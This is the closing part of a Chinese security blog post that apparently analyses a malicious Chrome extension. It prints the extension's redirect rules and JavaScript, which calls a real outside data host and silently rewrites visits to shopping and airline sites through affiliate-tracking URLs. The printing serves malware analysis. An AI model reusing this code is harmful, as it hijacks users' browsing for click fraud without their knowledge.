<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQETHVDP-MKIGQNPP%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;,<span class="attr">"airasia.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FTle6%2F__SUBID__"</span>&#125;&#125;,<span class="attr">"etihad.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FK3ei%2F__SUBID__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>用于处理推广数据的代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> host = <span class="string">"http://api.data-monitor.info/api/"</span>,</div><div class="line">wid = <span class="number">116</span>,</div><div class="line">rulesObject = &#123;&#125;,</div><div class="line">usedT = localStorage.usedT ? <span class="built_in">parseInt</span>(localStorage.usedT) : <span class="literal">null</span>, mainRgxp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"</span>), domainRgxp = <span class="regexp">/((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i</span>, listenFunc = <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>) &amp;&amp; <span class="number">0</span> === details.frameId &amp;&amp; <span class="string">"main_frame"</span> == details.type &amp;&amp; <span class="number">-1</span> === details.parentFrameId &amp;&amp; details.tabId &gt; <span class="number">0</span> &amp;&amp; <span class="regexp">/^https?/i</span>.test(details.url)) &#123;</div><div class="line">        <span class="keyword">var</span> current = details.url,</div><div class="line">        new_url = (prepareLink(current), tryUrl(current));</div><div class="line">        <span class="keyword">if</span> (<span class="string">"string"</span> == <span class="keyword">typeof</span> new_url &amp;&amp; current != new_url) <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">redirectUrl</span>: new_url</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">chrome.webRequest.onBeforeRequest.addListener(listenFunc, &#123;</div><div class="line">    <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">&#125;,</div><div class="line">[<span class="string">"blocking"</span>]), getData();</div></pre></td></tr></table></figure>
</div><div class="tags"></div><div class="post-nav"><a href="/2017/10/03/python脚本中使用Django函数/" class="next">python脚本中使用Django函数</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://weaponx.site"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tech/">技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">生活</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/整形溢出/" style="font-size: 15px;">整形溢出</a> <a href="/tags/博客/" style="font-size: 15px;">博客</a> <a href="/tags/安全/" style="font-size: 15px;">安全</a> <a href="/tags/影评/" style="font-size: 15px;">影评</a> <a href="/tags/Django/" style="font-size: 15px;">Django</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/UAF/" style="font-size: 15px;">UAF</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/ASLR/" style="font-size: 15px;">ASLR</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/wargame/" style="font-size: 15px;">wargame</a> <a href="/tags/漏洞分析/" style="font-size: 15px;">漏洞分析</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/调试/" style="font-size: 15px;">调试</a> <a href="/tags/逆向/" style="font-size: 15px;">逆向</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/15/Chrome恶意插件User-Agent-Switcher分析/">Chrome恶意插件User-Agent Switcher分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/03/python脚本中使用Django函数/">python脚本中使用Django函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/从Xshell后门看DLL加载流程/">从Xshell后门看DLL加载流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/如何在python中定义有序字典/">如何在python中定义有序字典</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/11/CVE-2016-0095从PoC到Exploit/">CVE-2016-0095从PoC到Exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/13/CVE-2017-9073-EsteemAudit分析-翻译自趋势科技/">CVE-2017-9073 EsteemAudit分析[翻译自趋势科技]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/07/NETBIOS主机名编码算法/">NETBIOS主机名编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/CVE-2010-2553分析-漏洞战争/">CVE-2010-2553分析[漏洞战争]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/19/ISCC中pwn200-shell无法启动原因详解/">ISCC中pwn200 shell无法启动原因详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/19/Ubuntu上源码调试glibc/">Ubuntu上源码调试glibc</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.cnblogs.com/goabout2/" title="goabout2" target="_blank">goabout2</a><ul></ul><a href="http://rootkiter.com/" title="RootKiter" target="_blank">RootKiter</a><ul></ul><a href="http://reverse-tcp.xyz/" title="Urahara" target="_blank">Urahara</a><ul></ul><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌" target="_blank">phith0n牛的离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">WeaponX's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>